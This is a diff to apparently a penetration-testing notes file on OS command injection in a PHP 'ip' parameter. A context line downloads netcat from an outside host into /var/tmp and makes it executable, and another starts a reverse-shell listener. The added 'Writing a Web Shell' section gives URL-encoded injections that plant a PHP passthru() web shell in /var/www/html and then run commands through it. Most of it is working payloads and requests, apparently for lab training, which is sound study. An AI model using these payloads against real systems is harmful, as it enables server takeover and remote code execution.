@@ -335,6 +335,33 @@ wget%20http://192.168.49.51:80/nc%20-O%20/var/tmp/nc%20;%20chmod%20755%20/var/tm
 ```shell
 nc -nlvp 9090
 ```
+#### Writing a Web Shell
+
+The first piece of information we need is our present working directory (the document root). We'll find this with pwd.
+
+```shell
+http://ci-sandbox:80/php/index.php?ip=127.0.0.1;pwd
+```
+
+Let's try to create our web shell in the web root of the target (/var/www/html/).
+
+We'll inject the following statement to create our web shell. It uses PHP's passthru() to execute our commands and display the results in the browser.
+
+```shell
+echo+"<pre><?php+passthru(\$_GET['cmd']);+?></pre>"+>+/var/www/html/webshell.php
+```
+
+```shell
+http://target:80/php/index.php?ip=127.0.0.1;echo+%22%3Cpre%3E%3C?php+passthru(\$_GET[%27cmd%27]);+?%3E%3C/pre%3E%22+%3E+/var/www/html/webshell.php
+```
+
+```shell
+http://target/webshell.php?cmd=ls-lsa
+```
+
+
+
+
 
 ![alt text](https://res.cloudinary.com/dqrcefije/image/upload/v1749448244/web-attack/explicit_checks.png)
 
